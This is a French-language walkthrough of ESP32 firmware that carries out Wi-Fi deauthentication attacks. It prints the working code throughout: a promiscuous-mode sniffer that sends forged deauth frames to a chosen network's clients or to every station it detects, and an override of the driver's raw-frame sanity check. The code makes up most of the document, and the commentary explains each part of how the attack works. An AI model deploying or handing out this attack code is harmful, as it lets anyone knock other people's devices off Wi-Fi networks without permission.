Ce code est un exemple de programme pour l'ESP32 qui permet de lancer une attaque par déauthentification (Deauthentication Attack) sur un réseau Wi-Fi. Ce type d'attaque vise à déconnecter les appareils d'un réseau Wi-Fi en envoyant des paquets de déauthentification forgés. Voici une explication détaillée du code :

### 1. **Inclusions et Déclarations Initiales**
```cpp
#include <WiFi.h>
#include <esp_wifi.h>
#include "types.h"
#include "deauth.h"
#include "definitions.h"
```
- **WiFi.h** : Bibliothèque pour gérer les fonctionnalités Wi-Fi de l'ESP32.
- **esp_wifi.h** : Bibliothèque pour les fonctions Wi-Fi de bas niveau de l'ESP32.
- **types.h**, **deauth.h**, **definitions.h** : Fichiers d'en-tête personnalisés contenant des définitions de types, des structures de données et des constantes utilisées dans le programme.

### 2. **Structures et Variables Globales**
```cpp
deauth_frame_t deauth_frame;
int deauth_type = DEAUTH_TYPE_SINGLE;
int eliminated_stations;
```
- **deauth_frame** : Une structure qui contient les informations nécessaires pour construire un paquet de déauthentification.
- **deauth_type** : Un entier qui détermine le type d'attaque de déauthentification (par exemple, attaque unique ou attaque sur toutes les stations).
- **eliminated_stations** : Un compteur pour suivre le nombre de stations déconnectées.

### 3. **Fonction `ieee80211_raw_frame_sanity_check`**
```cpp
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}
```
- Cette fonction est une fonction de vérification de la validité des paquets Wi-Fi. Ici, elle est redéfinie pour toujours retourner 0, ce qui signifie que tous les paquets sont considérés comme valides. Cela permet de contourner certaines vérifications de sécurité.

### 4. **Fonction `esp_wifi_80211_tx`**
```cpp
esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
```
- Cette fonction est utilisée pour envoyer des paquets Wi-Fi bruts. Elle est définie dans la bibliothèque `esp_wifi.h`.

### 5. **Fonction `sniffer`**
```cpp
IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  const wifi_promiscuous_pkt_t *raw_packet = (wifi_promiscuous_pkt_t *)buf;
  const wifi_packet_t *packet = (wifi_packet_t *)raw_packet->payload;
  const mac_hdr_t *mac_header = &packet->hdr;

  const uint16_t packet_length = raw_packet->rx_ctrl.sig_len - sizeof(mac_hdr_t);

  if (packet_length < 0) return;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(mac_header->dest, deauth_frame.sender, 6) == 0) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      eliminated_stations++;
    } else return;
  } else {
    if ((memcmp(mac_header->dest, mac_header->bssid, 6) == 0) && (memcmp(mac_header->dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)) {
      memcpy(deauth_frame.station, mac_header->src, 6);
      memcpy(deauth_frame.access_point, mac_header->dest, 6);
      memcpy(deauth_frame.sender, mac_header->dest, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
    } else return;
  }

  DEBUG_PRINTF("Send %d Deauth-Frames to: %02X:%02X:%02X:%02X:%02X:%02X\n", NUM_FRAMES_PER_DEAUTH, mac_header->src[0], mac_header->src[1], mac_header->src[2], mac_header->src[3], mac_header->src[4], mac_header->src[5]);
  BLINK_LED(DEAUTH_BLINK_TIMES, DEAUTH_BLINK_DURATION);
}
```
- **sniffer** : Cette fonction est un callback qui est appelé chaque fois qu'un paquet Wi-Fi est capturé en mode promiscuous.
  - **raw_packet** : Le paquet brut capturé.
  - **packet** : Le payload du paquet, contenant l'en-tête MAC.
  - **mac_header** : L'en-tête MAC du paquet.
  - **packet_length** : La longueur du paquet.
  - **deauth_type** : Détermine si l'attaque est ciblée (DEAUTH_TYPE_SINGLE) ou générale.
  - **esp_wifi_80211_tx** : Envoie des paquets de déauthentification forgés.
  - **DEBUG_PRINTF** : Affiche des informations de débogage.
  - **BLINK_LED** : Fait clignoter une LED pour indiquer l'envoi de paquets.

### 6. **Fonction `start_deauth`**
```cpp
void start_deauth(int wifi_number, int attack_type, uint16_t reason) {
  eliminated_stations = 0;
  deauth_type = attack_type;

  deauth_frame.reason = reason;

  if (deauth_type == DEAUTH_TYPE_SINGLE) {
    DEBUG_PRINT("Starting Deauth-Attack on network: ");
    DEBUG_PRINTLN(WiFi.SSID(wifi_number));
    WiFi.softAP(AP_SSID, AP_PASS, WiFi.channel(wifi_number));
    memcpy(deauth_frame.access_point, WiFi.BSSID(wifi_number), 6);
    memcpy(deauth_frame.sender, WiFi.BSSID(wifi_number), 6);
  } else {
    DEBUG_PRINTLN("Starting Deauth-Attack on all detected stations!");
    WiFi.softAPdisconnect();
    WiFi.mode(WIFI_MODE_STA);
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}
```
- **start_deauth** : Cette fonction initialise l'attaque de déauthentification.
  - **wifi_number** : L'indice du réseau Wi-Fi cible.
  - **attack_type** : Le type d'attaque (unique ou générale).
  - **reason** : La raison de la déauthentification (code de raison).
  - **WiFi.softAP** : Configure l'ESP32 en mode point d'accès (AP) pour l'attaque ciblée.
  - **esp_wifi_set_promiscuous** : Active le mode promiscuous pour capturer tous les paquets Wi-Fi.
  - **esp_wifi_set_promiscuous_filter** : Définit un filtre pour capturer uniquement les paquets pertinents.
  - **esp_wifi_set_promiscuous_rx_cb** : Définit la fonction de callback `sniffer`.

### 7. **Fonction `stop_deauth`**
```cpp
void stop_deauth() {
  DEBUG_PRINTLN("Stopping Deauth-Attack..");
  esp_wifi_set_promiscuous(false);
}
```
- **stop_deauth** : Cette fonction arrête l'attaque de déauthentification en désactivant le mode promiscuous.

### Résumé
Ce code permet à un ESP32 de lancer une attaque de déauthentification sur un réseau Wi-Fi. Il peut cibler un appareil spécifique ou tous les appareils connectés à un réseau. Le code utilise le mode promiscuous pour capturer les paquets Wi-Fi et envoie des paquets de déauthentification forgés pour déconnecter les appareils. Ce type d'attaque est souvent utilisé pour tester la sécurité des réseaux Wi-Fi, mais peut également être utilisé à des fins malveillantes.